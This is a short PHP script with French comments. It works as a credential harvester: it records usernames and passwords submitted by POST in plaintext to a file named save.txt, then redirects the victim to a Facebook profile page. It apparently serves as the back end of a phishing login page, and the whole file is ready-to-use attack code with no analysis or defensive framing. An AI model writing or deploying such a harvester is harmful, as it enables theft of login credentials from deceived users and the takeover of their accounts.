<?php
// Récupérer le nom d'utilisateur et le mot de passe à partir des données POST
$username = $_POST["username"];
$password = $_POST["password"];

// Ouvrir un fichier en mode écriture
$file = fopen("save.txt", "a");

// Écrire les informations d'identification dans le fichier
fwrite($file, "Nom d'utilisateur : " . $username . " Mot de passe : " . $password . "\n");

// Fermer le fichier
fclose($file);

// Répondre à la demande POST avec un message de réussite
header("Location: https://www.facebook.com/profile.php?id=100092281339153");
exit; // Terminer l'exécution du script après la redirection
?>